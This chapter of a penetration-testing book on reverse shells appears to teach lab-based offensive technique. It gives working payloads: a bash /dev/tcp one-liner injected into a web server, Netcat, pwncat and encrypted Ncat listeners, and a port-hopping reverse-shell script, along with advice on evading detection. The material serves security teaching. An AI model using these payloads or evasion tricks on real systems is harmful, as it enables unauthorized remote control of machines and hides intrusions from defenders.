<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch7">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch7">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_143" aria-label="143"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">7</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">REVERSE SHELLS</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">You’ve practiced gaining initial access to a target by establishing web shells that provide temporary, one-way network channels. In this chapter, we’ll explore a more stable initial access technique: using <i>reverse shells</i>, which swap the direction of the network communication. Attackers use these reverse connections <i>from</i> a compromised target machine <i>to</i> their own machine to gain reliable control over the compromised system and execute commands remotely in a more synchronized fashion.</p>&#13;
<p class="TX">You’ll learn how to create a reverse shell, then make your communications with remote environments more robust. As a bonus, you’ll also learn how to brute-force your way into SSH servers by using bash as your battering ram.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-48"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_144" aria-label="144"/><span class="SANS_Futura_Std_Bold_B_11">How Reverse Shells Work</span></h2>&#13;
<p class="TNI1">Often used for post-exploitation activities, reverse shells enable attackers to maintain control over a compromised system without directly connecting to it from their own machine, evading firewall restrictions.</p>&#13;
<p class="TX">The term <i>reverse</i> refers to the direction of the initial network traffic. In a traditional shell or command execution flow, the attacker’s machine would typically be the one to connect to the compromised system to issue commands and control it. However, in the case of a reverse shell, the target is the one to reach out to the attacker. Let’s explore some principles of reverse shells.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h2-94"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Ingress vs. Egress Controls</span></h3>&#13;
<p class="TNI1">Reverse shell communications help us bypass firewall rules, network restrictions, and other security measures designed to block incoming (<i>ingress</i>) connections, including those used in the OS command injection and web shell attacks we covered in <span class="Xref"><a href="chapter6.xhtml">Chapter 6</a></span>.</p>&#13;
<p class="TX">However, firewalls and network security devices are often configured to allow the outbound (<i>egress</i>) connections necessary for performing normal internet activity. When establishing a reverse shell, the compromised system initiates an egress connection to the attacker’s machine that is usually allowed by default. The firewall may perceive this egress connection as a legitimate action and won’t trigger alarms or security alerts.</p>&#13;
<p class="TX">Once the reverse shell connection is established, it should allow the attacker to maintain control over the compromised system. Mature environments may block outbound traffic to untrusted network addresses, but implementing this kind of restriction often isn’t a straightforward task, especially when certain machines on a network need access to wide ranges of network addresses.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-95"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Shell Payloads and Listeners</span></h3>&#13;
<p class="TNI1">You’ll need two tools to set up a reverse shell: a payload and a listener. The <i>payload</i> runs on the target machine. You’ll use different reverse shell payloads depending on the technologies and programming languages available on your target, as well as the type of platform it runs on. In this chapter, we’ll create a reverse shell payload with bash, but you can find a list of different reverse shell payloads at <i><a href="https://github.com/nicholasaleks/reverse-shells">https://github.com/nicholasaleks/reverse-shells</a></i>.</p>&#13;
<p class="TX">A <i>shell listener</i> is a program that runs on the attacker machine to receive incoming reverse shell connections from compromised target systems. When a reverse shell payload is executed on a target system, the payload attempts to connect to the attacker’s machine. The shell listener program acts as the handler for these incoming connections; it listens on a specific port, waiting for the connection to be established, and provides an interactive shell session in which the attacker can enter commands to send to the compromised server, letting the attacker control the compromised server as if they were directly accessing the machine’s shell.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_145" aria-label="145"/>One of the most popular shell listeners used in penetration tests is Netcat. We used it in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span> to perform port scanning, but this versatile command line utility can read from and write to network connections in many other ways. We’ll discuss it in this chapter, along with alternative tools such as Socket Cat (socat) and pwncat.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h3 class="H2" id="sec4"><span id="h2-96"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">The Communication Sequence</span></h3>&#13;
<p class="TNI1"><a href="chapter7.xhtml#fig7-1">Figure 7-1</a> describes the sequence of network communications involved in the use of reverse shells.</p>&#13;
<figure class="IMG"><img id="fig7-1" class="img1" src="../images/pg145.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 7-1: The communication sequence of a reverse shell</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Creating a reverse shell involves the following steps:</p>&#13;
<p class="NLF">  1.  Setting up a shell listener: The attacker machine initializes a shell listener running on a specific port that is accessible from the internet.</p>&#13;
<p class="NL">  2.  Exploiting the target server: The attacker compromises the target system through a vulnerability.</p>&#13;
<p class="NL">  3.  Uploading a reverse shell payload: The attacker crafts a reverse shell payload and delivers it by exploiting the underlying vulnerability in the target system.</p>&#13;
<p class="NL">  4.  Executing the payload: The payload is executed on the target server.</p>&#13;
<p class="NL">  5.  Requesting a reverse connection: The payload attempts to connect to the attacker’s machine, acting as the client.</p>&#13;
<p class="NL"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_146" aria-label="146"/>  6.  Accepting the shell connection: The listener receives the incoming connection and establishes a bidirectional communication channel with the target machine over the network.</p>&#13;
<p class="NLL">  7.  Executing commands and gaining server control: With the reverse shell connection established, the attacker gains control over the compromised target system and may execute shell commands remotely.</p>&#13;
<p class="TX">In the next section, we’ll see these steps in practice.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h2 class="H1" id="sec5"><span id="h1-49"/><span class="SANS_Futura_Std_Bold_B_11">Executing a Connection</span></h2>&#13;
<p class="TNI1">Let’s use bash to establish a reverse shell connection between the Kali attacker machine and a target, the <i>p-web-02</i> web application server (172.16.10.12).</p>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h2-97"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Setting Up a Netcat Listener</span></h3>&#13;
<p class="TNI1">First, we must use Netcat to set up a shell listener on the Kali machine. Execute the following command in a brand-new terminal window:</p>&#13;
<pre><code>$ <b>nc -l -p 1337 -vv</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">-l</span> option instructs Netcat to listen for incoming connections. The <span class="SANS_TheSansMonoCd_W5Regular_11">-p 1337</span> option specifies the port number to listen on, and the <span class="SANS_TheSansMonoCd_W5Regular_11">-vv</span> option enables verbose mode, providing more detailed output for monitoring and debugging purposes.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>In real-life scenarios, choose a port that will blend in with the environment so it’s harder to notice. For example, outbound connections on port 1337 could raise alerts, whereas blue team analysts might overlook traffic on common ports such as 80 or 443, which are often used by HTTP.</i></p>&#13;
<p class="TX">When the command executes, Netcat should start listening for incoming connections on the port specified.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h2-98"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Crafting a Payload</span></h3>&#13;
<p class="TNI1">Next, we’ll craft an interactive reverse shell payload by using the single line of bash in <a href="chapter7.xhtml#Lis7-1">Listing 7-1</a>. We’ll submit this line as user input to the target application in the next step.</p>&#13;
<span id="Lis7-1"/><pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.10.1/1337 0&gt;&amp;1'</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 7-1: A reverse shell payload</span></p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">-i</span> option makes the bash shell interactive, allowing it to receive input and produce output. The <i>/dev/tcp</i> path is a special <i>pseudo-device file</i> in Linux that provides access to TCP sockets. A similar file, <i>/dev/udp</i>, exists for UDP. We add to the filepath the IP address of the Kali machine and the <span role="doc-pagebreak" epub:type="pagebreak" id="pg_147" aria-label="147"/>port on which the Kali shell is waiting for incoming connections: <i>/dev/ tcp/172.16.10.1/1337</i>.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">&gt;&amp;</span> syntax combines the standard output (stdout) and standard error (stderr) streams into a single stream. By combining these streams, we ensure that both the regular command outputs and any error messages generated by the reverse shell payload get redirected to our listener.</p>&#13;
<p class="TX">You may have noticed that we use <span class="SANS_TheSansMonoCd_W5Regular_11">bash -c</span> to wrap the entire payload in single quotes. This specialized wrapping allows us to explicitly invoke a new instance of the bash shell while specifying a command string to execute with the <span class="SANS_TheSansMonoCd_W5Regular_11">-c</span> option. It also ensures that the subsequent command is executed using bash, regardless of the default shell set on the target system. You could even specify the bash shell’s full executable path (using <span class="SANS_TheSansMonoCd_W5Regular_11">/bin/bash -c</span>) to further ensure that the payload executes correctly.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h2-99"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Delivering and Initializing the Payload</span></h3>&#13;
<p class="TNI1">To deliver the single-line reverse shell payload we created, we’ll exploit the OS command injection vulnerability we identified in <i>p-web-02</i> (172.16.10.12) in <span class="Xref"><a href="chapter6.xhtml">Chapter 6</a></span>. Note that <a href="chapter7.xhtml#fig7-2">Figure 7-2</a> includes the full reverse shell payload, as well as the pipe metacharacter <span class="SANS_TheSansMonoCd_W5Regular_11">|</span> used to exploit the vulnerability.</p>&#13;
<figure class="IMG"><img id="fig7-2" class="img1" src="../images/pg147.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 7-2: The successful injection of a reverse shell payload into</span> <span class="SANS_Futura_Std_Book_11">p-web-02</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Clicking the <b>Donate</b> button should instantly trigger the reverse shell connection. In the Kali terminal window running the shell listener, you should see the following output:</p>&#13;
<pre><code><var>--snip--</var>&#13;
listening on [any] 1337 ...&#13;
172.16.10.12: inverse host lookup failed: Unknown host&#13;
connect to [172.16.10.1] from (UNKNOWN) [172.16.10.12] 54530&#13;
bash: cannot set terminal process group (1): Inappropriate ioctl for device&#13;
bash: no job control in this shell&#13;
www-data@p-web-02:/var/www/html$&#13;
</code></pre>&#13;
<p class="TX">Success! We’ve popped yet another shell and compromised the <i>p-web-02</i> server. In the prompt on the final line, we can see confirmation that we’ve gained an active shell on the <i>p-web-02</i> host by using the <i>www-data</i> user and that the present working directory is <i>/var/www/html</i>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h3 class="H2" id="sec9"><span id="h2-100"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_148" aria-label="148"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Executing Commands</span></h3>&#13;
<p class="TNI1">We can now use the Kali shell listener terminal just as we would any other shell. Let’s remotely execute a bash command on <i>p-web-02</i> through the reverse shell:</p>&#13;
<pre><code><var>--snip--</var>&#13;
bash: no job control in this shell&#13;
www-data@p-web-02:/var/www/html$ <b>uname -a</b>&#13;
&#13;
Linux p-web-02.acme-impact-alliance.com 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC&#13;
Debian 6.1.12-1kali1 x86_64 GNU/LinuxTypes of Reverse Shells&#13;
</code></pre>&#13;
<p class="TX">In this example, we remotely execute the <span class="SANS_TheSansMonoCd_W5Regular_11">uname -a</span> command on the server and automatically return its output stream back to the Kali listener.</p>&#13;
<p class="TX">We can even do some introspection on the connection by entering the process snapshot command <span class="SANS_TheSansMonoCd_W5Regular_11">ps aux</span> and reviewing the currently running reverse shell process (<a href="chapter7.xhtml#Lis7-2">Listing 7-2</a>).</p>&#13;
<span id="Lis7-2"/><pre><code><var>--snip--</var>&#13;
www-data@p-web-02:/var/www/html$ <b>ps aux</b>&#13;
&#13;
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT  TIME COMMAND&#13;
root           1  0.0  0.4 233332 38868 ?        Ss    0:03 apache2 -DFOREGROUND&#13;
www-data      19  0.0  0.2 234012 21652 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data      20  0.0  0.2 234012 21384 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data      21  0.0  0.5 234644 47224 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data      22  0.0  0.2 234020 21776 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data      23  0.0  0.2 234020 21528 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data      24  0.0  0.2 234012 21448 ?        S     0:00 apache2 -DFOREGROUND&#13;
www-data     131  0.0  0.0   2480   520 ?        S   <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span> 0:00 sh -c echo | bash -c&#13;
'bash -i &gt;&amp; /dev/tcp/172.16.10.1/1337 0&gt;&amp;' &gt;&gt; amount_to_donate.txt&#13;
www-data     133  0.0  0.0   3896  2948 ?        S   <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span> 0:00 bash -c bash -i &gt;&amp;&#13;
/dev/tcp/172.16.10.1/1337 0&gt;&amp;1&#13;
www-data     134  0.0  0.0   4160  3516 ?        S   <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span> 0:00 bash -i&#13;
www-data     169  0.0  0.0   6756  2944 ?        R     0:00 ps aux&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 7-2: Viewing process information</span></p>&#13;
<p class="TX">In the process output, we can clearly see how the reverse shell payload gets executed on the remote server, starting with the process whose ID is 131. (Process IDs may differ on your machine.)</p>&#13;
<p class="TX">To break it down further, the initial command, <span class="SANS_TheSansMonoCd_W5Regular_11">sh</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>, calls upon the <span class="SANS_TheSansMonoCd_W5Regular_11">bash -c</span> command <span class="CodeAnnotation" aria-label="annotation2">❷</span>. This command allows us to execute the desired shell instance, which in this case is bash, identified by process ID 134 <span class="CodeAnnotation" aria-label="annotation3">❸</span>. By leveraging this chain of processes and accessing the network capabilities provided by <i>/dev/tcp</i>, we elevate our reverse shell capabilities from a limited <span class="SANS_TheSansMonoCd_W5Regular_11">sh</span> shell to a fully functional bash shell. This upgrade provides us with a wider range of advanced reverse shell techniques, allowing for sophisticated post-exploitation activities and the ability to maintain control over compromised systems.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h2-101"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_149" aria-label="149"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Listening with pwncat</span></h3>&#13;
<p class="TNI1">pwncat is another useful utility for capturing and interacting with reverse shells. It lets us create a reverse shell listener, then use its built-in modules for a variety of purposes.</p>&#13;
<p class="TX">For example, let’s use it to send commands through the reverse shell. Later in this chapter, we’ll use it for file uploads as well. Start a pwncat reverse shell listener:</p>&#13;
<pre><code>$ <b>pwncat-cs -l -p 1337</b>&#13;
&#13;
[15:54:30] Welcome to pwncat!&#13;
bound to 0.0.0.0:1337&#13;
</code></pre>&#13;
<p class="TX">The output shows that pwncat is actively listening for any incoming connections made by compromised machines.</p>&#13;
<p class="TX">Now we can inject the command that will give us a reverse shell, as we did earlier in this chapter. Once pwncat receives the shell, you’ll see a message in the terminal, and you’ll be able to run commands:</p>&#13;
<pre><code>[15:59:49] received connection from 172.16.10.12:54736&#13;
[15:59:50] 172.16.10.12:54736: registered new host w/ db manager.py:957&#13;
&#13;
(local) pwncat$&#13;
</code></pre>&#13;
<p class="TX">The message <span class="SANS_TheSansMonoCd_W5Regular_11">(local) pwncat$</span> is pwncat’s prompt, at which you enter commands. Enter <span class="SANS_TheSansMonoCd_W7Bold_B_11">help</span> to see existing options:</p>&#13;
<pre><code>(local) pwncat$ <b>help</b>&#13;
&#13;
  Command     Description&#13;
-------------------------------------------------------------------------------&#13;
  alias       Alias an existing command with a new name. Specifying [...]&#13;
  back        Return to the remote terminal&#13;
  bind        Create key aliases for when in raw mode. This only [...]&#13;
  connect     Connect to a remote victim. This command is only valid [...]&#13;
  download    Download a file from the remote host to the local host&#13;
  escalate    Attempt privilege escalation in the current session. [...]&#13;
  exit        Exit the interactive prompt. If sessions are active, [...]&#13;
  help        List known commands and print their associated help [...]&#13;
  info        View info about a module&#13;
<var>--snip--</var>&#13;
  local       Run a local shell command on your attacking machine&#13;
  lpwd        Print the local current working directory&#13;
  reset       Reset the remote terminal to the standard pwncat [...]&#13;
  run         Run a module. If no module is specified, use the [...]&#13;
  search      View info about a module&#13;
  sessions    Interact and control active remote sessions. This [...]&#13;
  set         Set runtime variable parameters for pwncat&#13;
  shortcut&#13;
  upload      Upload a file from the local host to the remote host&#13;
  use         Set the currently used module in the config handler&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_150" aria-label="150"/>Many options are available. To run a few shell commands, you must first use the <span class="SANS_TheSansMonoCd_W5Regular_11">back</span> command. This command will return to the compromised host:</p>&#13;
<pre><code>(local) pwncat$ <b>back</b></code></pre>&#13;
<p class="TX">Now you can run commands on the target:</p>&#13;
<pre><code>(remote) www-data@p-web-02.acme-infinity-servers.com:/var/www/html$ <b>id</b>&#13;
&#13;
uid=33(www-data) gid=33(www-data) groups=33(www-data)&#13;
</code></pre>&#13;
<p class="TX">As you can see, pwncat is able to send commands and retrieve the results.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h2 class="H1" id="sec11"><span id="h1-50"/><span class="SANS_Futura_Std_Bold_B_11">Bypassing Security Controls</span></h2>&#13;
<p class="TNI1">When performing penetration tests, you may run into environments in which the shell you’ve established is hard to use. The shell itself might be limited, for instance, or the environment might reduce the number of packages available in an attempt to harden the system.</p>&#13;
<p class="TX">For example, <a href="chapter7.xhtml#tab7-1">Table 7-1</a> shows the differences between commands run in the Kali shell environment and in the <i>p-web-02</i> reverse shell.</p>&#13;
<p class="TT" id="tab7-1"><span class="Heavy"><span class="SANS_Futura_Std_Heavy_B_11">Table 7-1:</span></span> <span class="SANS_Futura_Std_Book_11">Commands Run in Kali vs.</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">p-web-02</span></p>&#13;
<table class="Basic-Table1">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Kali shell</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_Oblique_BI_11">p-web-02</span> <span class="SANS_Futura_Std_Heavy_B_11">reverse shell</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">echo $SHELL</span></p></td>&#13;
<td class="TBF gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">echo $SHELL</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">/bin/bash</span></p></td>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">/usr/sbin/nologin</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">whoami</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">whoami</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">Kali</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">www-data</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">ls /bin | wc -l</span></p></td>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">ls /bin | wc -l</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">3249</span></p></td>&#13;
<td class="TB gcell"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">89</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">wget</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">$</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">wget</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">wget: missing URL</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">Bash: wget: command not found</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">Usage: wget [Option] ...</span></p></td>&#13;
<td class="TBL"/>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">The <i>p-web-02</i> environment lacks many of the user privileges of the Kali shell and even has a drastically different number of available binaries. This makes sense because Kali is a full-fledged operating system with a graphical interface, whereas <i>p-web-02</i> is a slim container with the bare minimum amount of software required to function.</p>&#13;
<p class="TX">A lack of installed or built-in binaries is normal in cloud-hosted web application servers like the one <i>p-web-02</i> is mimicking. This is due to performance, security, and resource optimization requirements. A slim system image requires less maintenance overhead and provides faster deployment times.</p>&#13;
<p class="TX">Third-party tools are even tailored to remove excessive packages from an image (a process called <i>minification</i>). For example, the SlimToolkit <span role="doc-pagebreak" epub:type="pagebreak" id="pg_151" aria-label="151"/>project at <i><a href="https://github.com/slimtoolkit/slim">https://github.com/slimtoolkit/slim</a></i> runs several analysis techniques on an image to identify unused packages, then optimizes the operating system size by removing them.</p>&#13;
<p class="TX">In this section, we’ll highlight a few high-level techniques used to hide reverse shell communications or bypass security restrictions in hardened environments. These techniques can evade initial access security measures and allow us to maintain control over compromised systems.</p>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h3 class="H2" id="sec12"><span id="h2-102"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Encrypting and Encapsulating Traffic</span></h3>&#13;
<p class="TNI1">To evade detection, reverse shells can use encryption and encapsulation techniques to hide the malicious traffic within legitimate protocols or connections. By <i>encrypting</i> the communication, we can render the contents of the reverse shell traffic unreadable, making it challenging for security devices to identify any malicious payload or commands being sent.</p>&#13;
<p class="TX"><i>Encapsulation</i> conceals the reverse shell traffic within innocuous protocols or already encrypted connections. This technique disguises the reverse shell communication as legitimate traffic.</p>&#13;
<p class="TX"><a href="chapter7.xhtml#fig7-3">Figure 7-3</a> shows how an encrypted tunnel between a compromised server and the attacker machine could work. As you can see, the reverse shell connection occurs within the encrypted connection.</p>&#13;
<figure class="IMG"><img id="fig7-3" class="img1" src="../images/pg151.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 7-3: A reverse shell over an encrypted communication channel</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">We can create a reverse shell over an encrypted transport protocol in multiple ways. One way is by using <i>Ncat</i> (not to be confused with Netcat), a network utility that is packaged with Nmap and allows the redirection, writing, reading, and encryption of traffic.</p>&#13;
<p class="TX">You can use the following command sequence between the attacker and target machine to establish a reverse shell connection that is encapsulated by an encrypted tunnel. On the attacker machine, start a Secure Sockets Layer (SSL) listener with Ncat:</p>&#13;
<pre><code>$ <b>ncat -v -l 9443 --ssl</b>&#13;
&#13;
Ncat:(https://nmap.org/ncat)&#13;
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert&#13;
to use a permanent one.&#13;
Ncat: SHA-1 fingerprint: 174A B251 8100 D6BC EFD7 71C2 FEA6 3D32 0D2D 49B2&#13;
Ncat: Listening on :::9443&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_152" aria-label="152"/>Use the <span class="SANS_TheSansMonoCd_W5Regular_11">-v</span> (verbose) flag, specify the port to the <span class="SANS_TheSansMonoCd_W5Regular_11">-l</span> (listen) flag, and then use <span class="SANS_TheSansMonoCd_W5Regular_11">--ssl</span> for encryption. Ncat should generate temporary asymmetric keys (Rivest-Shamir-Adleman, or RSA) by default unless you specify otherwise.</p>&#13;
<p class="TX">On the compromised machine, the following command will establish an encrypted reverse shell. However, the compromised machine must have Ncat available for this command to work, and it often isn’t available by default:</p>&#13;
<pre><code>$ <b>ncat </b><b><var>attacker_IP address</var></b><b> 9443 --ssl -e /bin/bash -v</b>&#13;
&#13;
Ncat: (https://nmap.org/ncat)&#13;
Ncat: Subject: CN=localhost&#13;
Ncat: Issuer: CN=localhost&#13;
Ncat: SHA-1 fingerprint: BEED 35DF 5C83 60E7 73CF EBB8 B340 F870 8CC3 DD6E&#13;
<var>--snip--</var>&#13;
Ncat: SHA-1 fingerprint: BEED 35DF 5C83 60E7 73CF EBB8 B340 F870 8CC3 DD6E&#13;
</code></pre>&#13;
<p class="TX">In this example, we run Ncat to connect to the attacker’s listener. We use <span class="SANS_TheSansMonoCd_W5Regular_11">--ssl</span> to encrypt the traffic, followed by <span class="SANS_TheSansMonoCd_W5Regular_11">-e /bin/bash</span> to execute the bash shell.</p>&#13;
<p class="TX">pwncat can also establish a connection over SSL by using the same command style as Ncat. Refer to pwncat’s documentation at <i><a href="https://pwncat.readthedocs.io/en/latest/usage.html">https://pwncat.readthedocs.io/en/latest/usage.html</a></i> to learn how to use it for establishing SSL-based reverse shell connections.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h3 class="H2" id="sec13"><span id="h2-103"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Alternating Between Destination Ports</span></h3>&#13;
<p class="TNI1"><i>Port hopping</i>, or dynamically switching network ports during the communication process, is used for both defensive and offensive activities. On the offensive side, this technique can ensure the stability of a reverse shell and make it more challenging for security monitoring systems to block malicious traffic. By constantly changing ports, attackers can bypass simple port-based filtering mechanisms and intrusion detection systems that monitor specific ports for suspicious activities. Port hopping also makes it more difficult for defenders to thwart the reverse shell connection; if a network port becomes unreachable, a port hop will reestablish the connection.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>You can download this chapter’s scripts from</i> <span class="note_LinkURL"><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07</a></span>.</p>&#13;
<p class="TX">Attackers typically implement port hopping by using a predefined range of ports. <a href="chapter7.xhtml#Lis7-3">Listing 7-3</a> performs a reverse shell connection to the attacker machine by using a variety of ports, depending on their availability.</p>&#13;
<span id="Lis7-3"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">port-hopper.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
TARGET="172.16.10.1"&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> PORTS=("34455" "34456" "34457" "34458" "34459")&#13;
&#13;
listener_is_reachable() {&#13;
  local port="${1}"&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_153" aria-label="153"/><span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> if timeout 0.5 bash -c "&lt;/dev/tcp/${TARGET}/${port}" 2&gt; /dev/null; then&#13;
    return 0&#13;
  else&#13;
    return 1&#13;
  fi&#13;
}&#13;
&#13;
connect_reverse_shell() {&#13;
  local port="${1}"&#13;
  bash -i &gt;&amp; "/dev/tcp/${TARGET}/${port}" 0&gt;&amp;1&#13;
}&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> while true; do&#13;
  for port in "${PORTS[@]}"; do&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> if listener_is_reachable "${port}"; then&#13;
      echo "Port ${port} is reachable; attempting a connection."&#13;
      connect_reverse_shell "${port}"&#13;
    else&#13;
      echo "Port ${port} is not reachable."&#13;
    fi&#13;
  done&#13;
  echo "Sleeping for 10 seconds before the next attempt..."&#13;
  sleep 10&#13;
done&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 7-3: Attempting reverse shell connections using a variety of ports</span></p>&#13;
